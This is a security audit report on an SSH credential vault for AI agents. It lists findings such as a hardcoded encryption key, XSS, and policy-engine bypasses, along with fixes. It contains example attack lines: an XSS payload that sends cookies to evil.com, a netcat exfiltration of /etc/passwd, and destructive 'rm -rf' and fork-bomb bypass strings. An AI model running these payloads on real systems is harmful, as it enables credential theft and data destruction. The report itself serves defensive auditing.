# SSH Vault MCP - Comprehensive Security Audit Report

**Date:** 2026-02-15
**Auditor:** Automated Security Audit Team (7 parallel audit domains)
**Scope:** Full codebase review of SSH Vault MCP v0.1.0
**Classification:** CONFIDENTIAL

---

## Executive Summary

A comprehensive security audit was conducted across 7 domains: Authentication & Credentials, Input Validation & Injection, File System & Path Traversal, Network & SSH Protocol, Dependency & Supply Chain, Secrets Exposure & Information Leakage, and Authorization & Privilege Escalation.

The audit identified **critical architectural flaws** that fundamentally undermine the system's security model. The most severe finding is that the vault encryption key (VEK) is derived from hardcoded values in source code, rendering the entire encryption scheme ineffective. Combined with permissive file permissions and multiple authentication bypass vectors, an attacker with minimal access could decrypt all stored SSH credentials.

### Severity Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 5 |
| HIGH | 13 |
| MEDIUM | 22 |
| LOW | 7 |
| INFORMATIONAL | 5 |
| **TOTAL** | **52** |

---

## Table of Contents

1. [CRITICAL Findings](#critical-findings)
2. [HIGH Findings](#high-findings)
3. [MEDIUM Findings](#medium-findings)
4. [LOW Findings](#low-findings)
5. [INFORMATIONAL Findings](#informational-findings)
6. [Attack Chain Analysis](#attack-chain-analysis)
7. [Remediation Priority](#remediation-priority)

---

## CRITICAL Findings

### CRITICAL-01: Hardcoded Deterministic Vault Encryption Key (VEK)

**Files:** `src/web/server.ts:141-144`, `src/web/server.ts:284-287`, `src/web/server.ts:414-417`
**Domain:** Authentication, Cryptography

**Description:**
The Vault Encryption Key (VEK) is derived from a hardcoded string concatenated with the credential ID, using a static salt. The credential ID is stored in plaintext in the vault file metadata. This means anyone with access to the source code and vault file can derive the VEK and decrypt all stored SSH credentials.

**Vulnerable Code:**
```typescript
// src/web/server.ts:141-144
const serverSecret = new TextEncoder().encode('ssh-vault-server-secret-' + result.credential.id);
const salt = new TextEncoder().encode('ssh-vault-static-salt');
const vek = deriveKeyFromSignature(serverSecret, salt.slice(0, 16));
```

**Attack Scenario:**
1. Attacker obtains the vault file (`vault.enc`) from disk, backup, or Docker volume
2. Reads `credentialId` from the unencrypted vault file envelope
3. Concatenates with hardcoded prefix `'ssh-vault-server-secret-'`
4. Derives the same VEK using Argon2id with known parameters (t=3, m=65536, p=1)
5. Decrypts the entire vault, gaining all SSH private keys and passwords

**Impact:** Total compromise of all stored SSH credentials without needing the passkey hardware. The encryption is effectively decorative.

**Fix:** Use the actual WebAuthn authentication signature as key material for VEK derivation, or use a securely stored random server key (HSM/secure enclave), never hardcoded in source.

---

### CRITICAL-02: Vault File Written Without Restrictive Permissions

**File:** `src/vault/storage.ts:100-106`
**Domain:** File System Security

**Description:**
The vault file and its backups are written using Node.js default file permissions (typically `0o644`), making them readable by any user on the system. Combined with CRITICAL-01, any local user can read and decrypt the vault.

**Vulnerable Code:**
```typescript
// src/vault/storage.ts:100-106
const tempPath = `${this.vaultPath}.tmp`;
await fs.writeFile(tempPath, JSON.stringify(vaultFile, null, 2));  // No mode specified
await fs.rename(tempPath, this.vaultPath);
```

**Attack Scenario:**
1. On a multi-user system, attacker runs `cat /app/data/vault.enc`
2. File is world-readable (default `0o644`)
3. Combined with CRITICAL-01, attacker decrypts all SSH credentials

**Fix:** Set `{ mode: 0o600 }` on all file writes; set `0o700` on the data directory.

---

### CRITICAL-03: Unprotected Registration Endpoints Allow Vault Takeover

**File:** `src/web/server.ts:102-167`
**Domain:** Authentication

**Description:**
The `/api/register/options` and `/api/register/verify` endpoints have zero authentication or authorization. There is no check whether a vault already exists. Any network client can register a new passkey and overwrite the existing vault, destroying all stored credentials and gaining full vault ownership.

**Vulnerable Code:**
```typescript
// src/web/server.ts:102-121
this.app.post('/api/register/options', async (req: Request, res: Response) => {
  try {
    const { userId, userName } = req.body;
    // No vault existence check, no authentication required
    const { options, challengeId } = await this.webauthn.generateRegistrationOptions(userId, userName);
    res.json({ options, challengeId });
```

**Attack Scenario:**
1. Attacker sends POST to `/api/register/options` with arbitrary credentials
2. Completes WebAuthn registration with their own authenticator
3. New vault is created, overwriting all existing SSH credentials
4. Attacker now owns the vault with their passkey

**Fix:** Check if vault already exists before allowing registration; require existing authenticated session for re-registration.

---

### CRITICAL-04: No TLS -- All Traffic Including Credentials Transmitted in Cleartext

**File:** `src/config.ts:10-27`, `src/web/server.ts:613-618`
**Domain:** Network, Transport Security

**Description:**
The web server has no TLS support whatsoever -- there is no `https.createServer()` call anywhere in the codebase. Default config uses `http://localhost:3001`. All API calls including Passkey registration/authentication, vault management (which transmits SSH private keys and passwords in POST bodies), management session Bearer tokens, and SSE challenge notifications travel in cleartext. WebAuthn is designed for HTTPS origins; browsers will refuse Passkey operations on HTTP except on localhost.

**Attack Scenario:**
1. Management page sends SSH private keys via `POST /api/manage/hosts` over HTTP
2. Any network observer (Wi-Fi sniffer, corporate proxy) captures credentials in transit
3. Bearer tokens in `Authorization` headers are captured for session hijacking

**Fix:** Implement TLS support in the web server or mandate deployment behind a TLS-terminating reverse proxy. Reject non-localhost `http://` origins in config validation.

---

### CRITICAL-05: Missing SSH Host Key Verification -- Complete MITM Exposure

**File:** `src/ssh/executor.ts:41-46`, `src/ssh/executor.ts:161-166`
**Domain:** Network, SSH Protocol

**Description:**
The SSH `ConnectConfig` is constructed without any `hostVerify` callback, `hostHash`, or `hostKey` properties. The ssh2 library will accept **any host key** presented by the remote server, enabling trivial man-in-the-middle attacks on every SSH connection. An attacker performing ARP spoofing, DNS poisoning, or BGP hijacking can intercept all SSH connections, capture transmitted credentials, and read all commands and output.

**Vulnerable Code:**
```typescript
const connectConfig: ConnectConfig = {
  host: host.hostname,
  port: host.port,
  username: host.username,
  readyTimeout: 10000,
  // No hostVerify, no algorithms restriction
};
```

**Fix:** Add `hostVerify` callback comparing against stored host key fingerprints; add `expectedHostKeyFingerprint` field to Host type; restrict algorithms to modern ciphers only.

---

## HIGH Findings

### HIGH-01: Replay Attack Window via Nonce Cleanup

**File:** `src/auth/agent.ts:158-163`
**Domain:** Authentication

**Description:**
The nonce replay protection uses an in-memory `Set` that is completely cleared every 10 minutes. After cleanup, previously used nonces can be replayed within the 5-minute timestamp validity window.

**Vulnerable Code:**
```typescript
export function cleanupNonces(): void {
  usedNonces.clear();  // Removes ALL nonces, not just expired ones
}
setInterval(cleanupNonces, 10 * 60 * 1000);
```

**Attack Scenario:** Attacker captures a signed request at T=9min, nonces clear at T=10min, replays the request which still has 4 minutes of timestamp validity remaining.

**Fix:** Use `Map<string, number>` with timestamps; only remove nonces older than `REQUEST_VALIDITY_MS`.

---

### HIGH-02: WebAuthn Authenticator Counter Never Validated/Persisted

**File:** `src/web/server.ts:271-275`
**Domain:** Authentication

**Description:**
The authenticator counter is hardcoded to `0` during verification. The `updateCounter()` method exists in `VaultStorage` but is never called. Clone detection is completely disabled.

**Vulnerable Code:**
```typescript
// Counter always passed as 0, never updated after auth
counter: 0, // Will be checked from vault  <-- comment is a lie
```

**Fix:** After successful auth, call `storage.updateCounter(result.newCounter, vek)`.

---

### HIGH-03: Brute-Forceable Unlock Codes (24-bit Entropy, No Rate Limiting)

**File:** `src/vault/encryption.ts:154-162`
**Domain:** Authentication

**Description:**
Unlock codes are 5 characters from a 28-character alphabet = only 17,210,368 possible codes (~24 bits entropy). No rate limiting exists on the `submitUnlockCode` endpoint. Modulo bias (`256 % 28 = 4`) further reduces effective entropy.

**Attack Scenario:** Brute-force all ~17M codes within seconds on a local connection.

**Fix:** Increase code length to 8-10 chars; add rate limiting with exponential backoff; add lockout after N failures; fix modulo bias with rejection sampling.

---

### HIGH-04: Unlock Code Not Bound to Requesting Agent

**File:** `src/vault/vault.ts:289-308`
**Domain:** Authentication, Authorization

**Description:**
When an unlock code is submitted, the code iterates all pending challenges looking for a match but never verifies the submitting agent's fingerprint matches the challenge's stored `agentFingerprint`. Any agent with the unlock code can create a session.

**Vulnerable Code:**
```typescript
async submitUnlockCode(unlockCode: string, agentFingerprint: string) {
  for (const [id, pending] of this.pendingChallenges.entries()) {
    if (pending.unlockCode === unlockCode && pending.signature) {
      // Never checks: pending.agentFingerprint === agentFingerprint
      foundChallenge = pending;
```

**Fix:** Add `if (foundChallenge.agentFingerprint !== agentFingerprint) return error`.

---

### HIGH-05: No Path Validation on Vault Path from Configuration

**Files:** `src/config.ts:37-58`, `src/vault/storage.ts:25`
**Domain:** File System

**Description:**
The `vault.path` config value is used directly for all file I/O without path validation or canonicalization. A malicious config could target any file on the filesystem.

**Attack Scenario:** Set `vault.path: /etc/shadow` to overwrite system auth files on vault creation.

**Fix:** Canonicalize with `path.resolve()` and validate the path is within an allowed base directory.

---

### HIGH-06: Static File Server Could Expose Backup Files

**File:** `src/web/server.ts:43-44`
**Domain:** File System

**Description:**
Express static file serving has no restrictions on backup/sensitive file extensions. If vault files end up in or near the web directory (misconfiguration, symlinks), they become web-accessible.

**Fix:** Add middleware to deny `.backup`, `.tmp`, `.enc` extensions; validate vault path is never inside web directory.

---

### HIGH-07: TOCTOU Race Condition in Vault File Operations

**File:** `src/vault/storage.ts:74-106`
**Domain:** File System

**Description:**
The `save()` method uses a static temp filename (`vault.enc.tmp`). Concurrent saves corrupt each other; the temp file path is vulnerable to symlink attacks.

**Fix:** Use unique temp filenames (`${pid}.${Date.now()}`); use `O_EXCL` flag; add file locking.

---

### HIGH-08: No Session Required for Command Execution

**File:** `src/mcp/server.ts:507-627`
**Domain:** Authorization

**Description:**
The `execute_command` tool checks vault unlock status and agent registration but does NOT require an active session. A registered agent can piggyback on any other agent's unlock to execute globally-allowed commands.

**Vulnerable Code:**
```typescript
const session = this.vaultManager.getSessionByAgent(fingerprint);
// session can be null -- policyEngine.checkCommand accepts undefined session
const policyResult = this.policyEngine.checkCommand(
  agent, host.name, command, policy, session || undefined
);
```

**Fix:** Require `session !== null` before allowing command execution.

---

### HIGH-09: DOM-Based XSS via Challenge Data in Approval Page

**File:** `web/auth.html:284-293`
**Domain:** Injection, Client-Side

**Description:**
The `displayChallengeInfo()` function renders challenge data from the server API directly into the DOM using `innerHTML` without HTML escaping. The `info.host`, `info.commands`, and `info.agent` values are injected as raw HTML.

**Vulnerable Code:**
```javascript
let html = `<div class="host">Host: ${info.host}</div>`;
if (info.commands && info.commands.length > 0) {
  html += '<div class="command">' + info.commands.join('<br>') + '</div>';
}
actionDetail.innerHTML = html;
```

**Attack Scenario:**
1. Attacker (as agent) calls `execute_command` with `command` set to `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
2. Policy engine denies the command, creating an approval challenge storing the malicious string
3. Vault owner opens the approval URL, XSS payload executes in their browser
4. Attacker steals session tokens or tricks user into approving malicious actions

**Fix:** Use `textContent` instead of `innerHTML`, or implement `escapeHtml()` on all interpolated values.

---

### HIGH-10: DOM-Based XSS via Stored Vault Data in Management UI

**File:** `web/manage.html:543-578`
**Domain:** Injection, Client-Side

**Description:**
Multiple rendering functions (`renderHosts`, `renderAgents`, `renderSessions`) build HTML via string interpolation from vault data and inject via `innerHTML`. Host names, hostnames, usernames, tags, agent names, fingerprints, and allowed hosts/commands are all rendered unescaped. Additionally, `onclick="deleteHost('${h.id}')"` is vulnerable to attribute injection if `id` contains single quotes.

**Fix:** Escape all user-controlled values; use `data-*` attributes with event listeners instead of inline handlers.

---

### HIGH-11: No SSH Algorithm Restrictions -- Weak Cipher Downgrade

**File:** `src/ssh/executor.ts:41-46`
**Domain:** Network, SSH Protocol

**Description:**
The SSH `ConnectConfig` does not specify algorithm preferences. The ssh2 library will negotiate using whatever algorithms the remote server supports, including deprecated or weak algorithms like `diffie-hellman-group1-sha1`, `ssh-dss`, `arcfour`, or `hmac-md5`. An attacker capable of downgrade attacks could force weak algorithm negotiation.

**Fix:** Explicitly set `algorithms` property to allow only modern ciphers: `curve25519-sha256` (kex), `ssh-ed25519` (hostkey), `aes256-gcm@openssh.com` (cipher), `hmac-sha2-256-etm@openssh.com` (hmac).

---

### HIGH-12: SSH Command Injection via Unvalidated Input

**File:** `src/ssh/executor.ts`
**Domain:** Injection

**Description:**
Commands passed to the SSH executor are forwarded directly to the remote SSH server's shell without sanitization. While the policy engine blocks some dangerous patterns, it uses a denylist approach that can be bypassed with shell encoding tricks, backticks, `$()` substitution, newlines, or semicolons.

**Bypass Examples:**
- Policy blocks `rm -rf /` but allows `rm -rf /$(echo '')`
- `` `cat /etc/shadow` `` embedded in allowed commands
- Newline injection: `ls\nrm -rf /`
- Unicode/encoding tricks to bypass regex patterns

**Fix:** Use allowlist-only approach; reject commands containing shell metacharacters (`; | & $ \` \n`); consider parameterized command execution.

---

### HIGH-13: Policy Dangerous Pattern Detection Easily Bypassed

**File:** `src/policy/engine.ts`
**Domain:** Authorization, Injection

**Description:**
The dangerous pattern detection uses simple regex matching that can be circumvented through numerous techniques: variable expansion (`$HOME`), aliasing, path variations (`/bin/rm` vs `rm`), encoding, whitespace tricks, and heredoc injection.

**Bypass Examples:**
```bash
# Fork bomb bypass (pattern: `:(){:|:&};:`)
bomb(){ bomb|bomb& };bomb    # Different function name
# rm bypass (pattern: `rm -rf /`)
rm -r -f /                    # Split flags
/bin/rm -rf /                 # Absolute path
```

**Fix:** Implement allowlist-only command execution; parse commands into AST for analysis; block all shell metacharacters.

---

## MEDIUM Findings

### MEDIUM-01: Timing Side-Channel in Unlock Code Comparison

**File:** `src/vault/vault.ts:300-308`

Uses JavaScript `===` for string comparison, which is not constant-time. Combined with brute-force vulnerability, enables character-by-character discovery.

**Fix:** Use `crypto.timingSafeEqual()`.

---

### MEDIUM-02: Management Sessions Not Cleared on Vault Lock

**File:** `src/web/server.ts:369`

The `manageSessions` map is local to `setupRoutes()` and invisible to `VaultManager.lock()`. Locking the vault does not invalidate management sessions.

**Fix:** Move `manageSessions` to class level; wire `lock()` to clear and wipe them.

---

### MEDIUM-03: VEK Not Wiped from Management Sessions on Delete

**File:** `src/web/server.ts:576-582`

When management sessions are deleted, `secureWipe()` is never called on the VEK `Uint8Array`.

**Fix:** Call `secureWipe(session.vek)` before `manageSessions.delete(token)`.

---

### MEDIUM-04: No CSRF Protection on State-Changing Endpoints

**File:** `src/web/server.ts:36-39`

CORS is configured but no CSRF tokens are validated on state-changing POST/DELETE endpoints.

**Fix:** Implement CSRF tokens for all state-changing endpoints.

---

### MEDIUM-05: SSE Endpoint Lacks Authentication, Leaks Session IDs

**File:** `src/web/server.ts:323-366`

The `/api/challenge/:id/listen` SSE endpoint requires no authentication. When a challenge is approved, the `sessionId` is broadcast to all listeners.

**Fix:** Require signed request or listener token; do not include `sessionId` in SSE events.

---

### MEDIUM-06: `list_hosts` Exposes All Hosts to Any Signed Agent

**File:** `src/mcp/server.ts:468-505`

Returns all vault hosts regardless of the agent's `allowedHosts` configuration. The `_fingerprint` parameter is explicitly unused (prefixed with underscore).

**Fix:** Filter hosts through `PolicyEngine.checkHostAccess()`.

---

### MEDIUM-07: No Rate Limiting on `request_access` (Approval Fatigue)

**Files:** `src/mcp/server.ts:345-399`, `src/web/server.ts:170-219`

Unauthenticated endpoints with no rate limiting. Enables memory exhaustion and approval fatigue attacks.

**Fix:** Rate limit by IP/public key; cap pending challenges.

---

### MEDIUM-08: Default Configuration Binds to 0.0.0.0 over HTTP

**File:** `src/config.ts:11-14`

Default server binds to all interfaces over unencrypted HTTP. All web-facing vulnerabilities become remotely exploitable.

**Fix:** Default to `127.0.0.1`; enforce HTTPS on non-loopback interfaces.

---

### MEDIUM-09: Private Key Returned Through MCP/LLM Context

**File:** `src/mcp/server.ts:328-343`

The `generate_keypair` tool returns Ed25519 private key material in the MCP response, which enters the LLM context and may be logged.

**Fix:** Write private key to a secure file; return only file path and public key/fingerprint.

---

### MEDIUM-10: Symlink Following on All File Operations

**File:** `src/vault/storage.ts` (multiple lines)

All file operations follow symlinks without validation. Symlink at vault path can redirect reads/writes to arbitrary system files.

**Fix:** Check `fs.lstat()` for symlinks before operations; validate with `fs.realpath()`.

---

### MEDIUM-11: Docker Container Runs as Root

**File:** `Dockerfile:17-42`

No `USER` directive in the Dockerfile. Application runs as root inside the container, increasing blast radius of any exploitation.

**Fix:** Add `RUN adduser` and `USER` directives.

---

### MEDIUM-12: Config Search Path Allows Local Override Attacks

**File:** `src/config.ts:38-45`

Configuration loader searches CWD for config files. Attacker with write access to CWD can inject malicious configuration.

**Fix:** When `SSH_VAULT_CONFIG` is set, use only that path; warn on discovered configs.

---

### MEDIUM-13: Nonce State Lost on Process Restart

**File:** `src/auth/agent.ts:12-13`

In-memory nonce `Set` is lost on restart, enabling replay of captured requests.

**Fix:** Persist nonces to disk; reject requests with timestamps before server start time.

---

### MEDIUM-14: Missing Security Headers on HTTP Responses

**File:** `src/web/server.ts`

No CSP, HSTS, X-Frame-Options, X-Content-Type-Options, or X-XSS-Protection headers configured on the Express server.

**Fix:** Use `helmet` middleware or set headers manually.

---

### MEDIUM-15: No Rate Limiting on Authentication Endpoints

**File:** `src/web/server.ts`

No rate limiting on `/api/auth/*`, `/api/register/*`, or `/api/manage/auth` endpoints. Enables brute-force attacks.

**Fix:** Implement rate limiting (e.g., `express-rate-limit`) on all auth endpoints.

---

### MEDIUM-16: CORS Configured but Potentially Misconfigurable

**File:** `src/web/server.ts:36-39`

CORS origin comes from config file. If set to `*` or overly broad, cross-origin attacks are enabled against all endpoints.

**Fix:** Validate CORS origin in config validation; reject wildcards when `credentials: true`.

---

### MEDIUM-17: DNS Rebinding Attack via Missing Host Header Validation

**File:** `src/web/server.ts:36-39`

The Express CORS middleware only sets response headers but does **not** block requests from unauthorized origins. With default CORS origin `http://localhost:3001` and no Host header validation, DNS rebinding can bypass same-origin policy. Attacker's page can send requests to vault server -- the route handler still executes even though CORS headers prevent response reading.

**Fix:** Add Host header validation middleware; switch CORS to return error for mismatched origins instead of just omitting headers.

---

### MEDIUM-18: Unbounded SSH Output Buffer -- Memory Exhaustion DoS

**File:** `src/ssh/executor.ts:69-75`

The `execute` method concatenates all stdout/stderr data into unbounded strings. A malicious SSH host or long-running command (`cat /dev/urandom`) can produce gigabytes of output, exhausting server memory and crashing the process.

**Fix:** Implement max output size limit (e.g., 10MB); close stream and reject on exceeded limit.

---

### MEDIUM-19: Missing Input Validation on Host/Agent Management APIs

**File:** `src/vault/vault.ts`

Decrypted vault data (including SSH private keys and passwords) remains in memory for the entire session lifetime (up to 30 minutes by default).

**Fix:** Decrypt credentials only when needed for execution; wipe immediately after use.

---

### MEDIUM-21: Missing Input Validation on Host/Agent Management APIs

**File:** `src/web/server.ts:457-549`

The `/api/manage/hosts` and `/api/manage/agents` endpoints accept arbitrary input without validating field types, lengths, or formats. No validation that `hostname` is valid, `port` is 1-65535, or that credential format is expected. Enables SSH host injection (connecting to attacker-controlled servers) and DoS via oversized payloads.

**Fix:** Add Zod schema validation for all management API inputs.

---

### MEDIUM-22: DOM XSS via Unlock Code Injection

**File:** `web/auth.html:451-465`

The `showUnlockCode()` function injects server-provided unlock code directly into `innerHTML`. While the code is generated from a constrained charset server-side, the client trusts the response entirely. An MITM or compromised server could exploit this.

**Fix:** Use `textContent` instead of `innerHTML` for the unlock code display.

---

## LOW Findings

### LOW-01: Modulo Bias in Unlock Code Generation

**File:** `src/vault/encryption.ts:156-160`

`bytes[i] % 28` with 256 not divisible by 28 creates non-uniform distribution.

**Fix:** Use rejection sampling.

---

### LOW-02: `secureWipe` Ineffective in JavaScript

**File:** `src/vault/encryption.ts:167-169`

`buffer.fill(0)` may be optimized away by JIT compiler. V8 may retain copies in internal buffers.

**Fix:** Use `crypto.randomFill()` or document as known limitation.

---

### LOW-03: Unbounded Nonce Set Memory Growth

**File:** `src/auth/agent.ts:12-13`

Nonce `Set` grows without bounds between cleanup intervals. Enables memory exhaustion DoS.

**Fix:** Cap nonce set size; use `Map` with timestamps for granular cleanup.

---

### LOW-04: Temporary File Not Cleaned Up on Write Failure

**File:** `src/vault/storage.ts:104-106`

If `fs.rename()` fails, the `.tmp` file persists on disk with world-readable permissions.

**Fix:** Wrap in try/finally to unlink temp file on failure.

---

### LOW-05: Error Messages May Leak Internal State

**Files:** Multiple `catch` blocks across `src/web/server.ts`, `src/mcp/server.ts`

Error messages returned to clients include raw error strings that may reveal internal paths, stack traces, or configuration details.

**Fix:** Return generic error messages to clients; log details server-side only.

---

### LOW-06: Policy Bypass via Command Wrapper Evasion

**File:** `src/policy/engine.ts:111-131`

The `extractBaseCommand()` function skips known wrappers (`sudo`, `env`, `nohup`, etc.) but can be bypassed with path-prefixed commands (`/usr/bin/rm`), unlisted wrappers (`bash -c "..."` ), semicollon chaining (`ls ; rm -rf /`), and pipe chaining (`cat /etc/passwd | nc attacker.com 4444`). The base command extraction returns `ls` or `cat` which passes the allowlist, while the destructive chained portion executes.

**Fix:** Reject commands containing shell metacharacters; resolve absolute paths before matching; consider full command analysis.

---

### LOW-07: Unbounded Management Session Map

**File:** `src/web/server.ts:369,419-423`

The `manageSessions` Map has no size limit. An attacker who repeatedly authenticates can create unlimited sessions consuming memory. Session tokens stored in JavaScript variables are accessible to any XSS payload (no HttpOnly protection).

**Fix:** Cap max concurrent management sessions; clear oldest when limit reached.

---

## INFORMATIONAL Findings

### INFO-01: `.gitignore` Missing `.backup` and `.tmp` Exclusions

**File:** `.gitignore`

Could lead to accidental commit of vault backup files.

---

### INFO-02: Docker Volume Mount Exposes Data Without Access Control

**File:** `docker-compose.yml:9-11`

Read-write bind mount with root-owned container creates permission management issues.

---

### INFO-03: Source Maps Generated in Build

**File:** `tsconfig.json`

`sourceMap: true` generates `.js.map` files that could aid reverse engineering in production.

---

### INFO-05: Unnecessary MCP Port 3000 Exposed in Docker

**Files:** `docker-compose.yml:7`, `Dockerfile:34`

Port 3000 is exposed but MCP uses stdio transport (`StdioServerTransport`), not TCP. No network listener exists on port 3000. Wastes a port mapping and creates confusion.

---

### INFO-04: Development Scripts Contain Example Credentials

**Files:** `scripts/add-test-data.ts`, `scripts/demo-flow.ts`

Example SSH credentials and keys in test scripts. Not a direct vulnerability but could be confusing if treated as real credentials.

---

## Attack Chain Analysis

### Chain 1: Full Vault Compromise (Remote, No Auth Required)

```
CRITICAL-01 (Hardcoded VEK) + CRITICAL-02 (World-readable files) + MEDIUM-08 (Bound to 0.0.0.0)
```

1. Attacker accesses web server remotely (MEDIUM-08)
2. If vault file is accessible via static serving (HIGH-06) or backup exposure
3. Reads `credentialId` from vault file envelope
4. Derives VEK using hardcoded formula (CRITICAL-01)
5. Decrypts all SSH credentials
6. **Result: Complete compromise of all managed SSH servers**

### Chain 2: Vault Takeover via Registration

```
CRITICAL-03 (No auth on registration) + MEDIUM-08 (Bound to 0.0.0.0)
```

1. Attacker accesses registration endpoint remotely
2. Registers their own passkey, overwriting existing vault
3. Creates new vault with their controlled credentials
4. **Result: Denial of service + attacker controls vault**

### Chain 3: Session Hijacking via Unlock Code

```
HIGH-03 (Weak unlock codes) + HIGH-04 (No agent binding) + MEDIUM-01 (Timing attack)
```

1. Legitimate agent requests vault unlock
2. Attacker brute-forces the 24-bit unlock code (17M possibilities)
3. Uses timing side-channel to speed up brute-force
4. Obtains session under attacker's fingerprint
5. **Result: Unauthorized vault session**

### Chain 4: Piggybacking on Another Agent's Session

```
HIGH-08 (No session required) + HIGH-11 (Command injection)
```

1. Legitimate Agent A unlocks the vault
2. Agent B (registered, no session) calls `execute_command`
3. Vault is unlocked so command executes
4. Agent B injects shell commands bypassing policy (HIGH-12)
5. **Result: Arbitrary command execution on SSH targets**

### Chain 5: Social Engineering via XSS in Approval Page

```
HIGH-09 (XSS in auth.html) + HIGH-10 (XSS in manage.html) + MEDIUM-08 (Bound to 0.0.0.0)
```

1. Attacker agent submits command containing XSS payload (e.g., `<img src=x onerror="...">`)
2. Policy engine denies, creates approval challenge with malicious command string
3. Vault owner opens approval URL, XSS executes in their browser
4. Payload auto-clicks "Approve" button or steals management session token
5. **Result: Unauthorized command approval or management session takeover**

### Chain 6: Persistent Access via Replay

```
HIGH-01 (Nonce cleanup) + MEDIUM-13 (State lost on restart)
```

1. Attacker captures signed MCP requests
2. After nonce cleanup (every 10 min) or process restart
3. Replays captured requests to execute commands
4. **Result: Persistent unauthorized command execution**

---

## Remediation Priority

### Immediate (P0) - Deploy blockers

| ID | Finding | Effort |
|----|---------|--------|
| CRITICAL-01 | Replace hardcoded VEK with proper key derivation from WebAuthn signature | High |
| CRITICAL-02 | Set `0o600` permissions on all vault file operations | Low |
| CRITICAL-03 | Add vault existence check to registration endpoints | Low |
| CRITICAL-04 | Implement TLS or mandate reverse proxy with TLS | Medium |
| CRITICAL-05 | Add SSH host key verification with stored fingerprints | Medium |
| HIGH-03 | Increase unlock code entropy + add rate limiting | Medium |
| HIGH-08 | Require active session for `execute_command` | Low |

### High Priority (P1) - Next sprint

| ID | Finding | Effort |
|----|---------|--------|
| HIGH-01 | Fix nonce cleanup to use timestamped expiry | Low |
| HIGH-02 | Persist WebAuthn authenticator counter | Low |
| HIGH-04 | Bind unlock codes to requesting agent | Low |
| HIGH-05 | Validate vault path in configuration | Low |
| HIGH-09 | Fix DOM XSS in approval page (escapeHtml) | Low |
| HIGH-10 | Fix DOM XSS in management UI (escapeHtml) | Low |
| HIGH-11 | Restrict SSH algorithms to modern ciphers | Low |
| HIGH-12 | Sanitize SSH commands; block shell metacharacters | Medium |
| HIGH-13 | Strengthen policy engine with allowlist approach | High |
| MEDIUM-08 | Default bind to 127.0.0.1 | Low |
| MEDIUM-14 | Add security headers (helmet) | Low |
| MEDIUM-15 | Add rate limiting on auth endpoints | Low |

### Medium Priority (P2) - Within 30 days

| ID | Finding | Effort |
|----|---------|--------|
| MEDIUM-01 | Use constant-time comparison for unlock codes | Low |
| MEDIUM-02 | Clear management sessions on vault lock | Low |
| MEDIUM-03 | Wipe VEK from management sessions on delete | Low |
| MEDIUM-04 | Add CSRF protection | Medium |
| MEDIUM-05 | Authenticate SSE endpoints | Medium |
| MEDIUM-06 | Filter `list_hosts` by agent permissions | Low |
| MEDIUM-07 | Rate limit `request_access` | Low |
| MEDIUM-09 | Stop returning private keys through MCP | Low |
| MEDIUM-10 | Add symlink protection to file operations | Low |
| MEDIUM-11 | Run Docker container as non-root | Low |
| MEDIUM-12 | Harden config file search path | Low |
| MEDIUM-13 | Persist nonces or reject pre-restart timestamps | Medium |
| MEDIUM-16 | Validate CORS origin configuration | Low |
| MEDIUM-17 | Add Host header validation for DNS rebinding | Low |
| MEDIUM-18 | Cap SSH output buffer size (10MB) | Low |
| MEDIUM-19 | Minimize credential time in memory | Medium |
| MEDIUM-20 | SSH credentials held in memory too long | Medium |
| MEDIUM-21 | Add Zod validation to management API inputs | Low |
| MEDIUM-22 | Fix unlock code DOM XSS (use textContent) | Low |

### Low Priority (P3) - Within 90 days

| ID | Finding | Effort |
|----|---------|--------|
| LOW-01 to LOW-07 | Various low-severity hardening | Low each |
| INFO-01 to INFO-05 | Informational improvements | Low each |

---

## Methodology

This audit was conducted by 7 specialized parallel analysis teams:

1. **Authentication & Credential Handling** - WebAuthn, agent auth, encryption, sessions
2. **Input Validation & Injection** - Command injection, XSS, SSRF, policy bypass
3. **File System & Path Traversal** - File operations, permissions, symlinks, Docker
4. **Network & SSH Protocol** - CORS, headers, transport, SSH configuration
5. **Dependency & Supply Chain** - CVEs, version pinning, base images
6. **Secrets Exposure & Information Leakage** - Hardcoded secrets, logging, memory
7. **Authorization & Privilege Escalation** - Access control, policy bypass, sessions

Each team performed line-by-line review of all relevant source files (~3,500 LOC of TypeScript + ~600 LOC of HTML/JS frontend code).

---

*End of Security Audit Report*
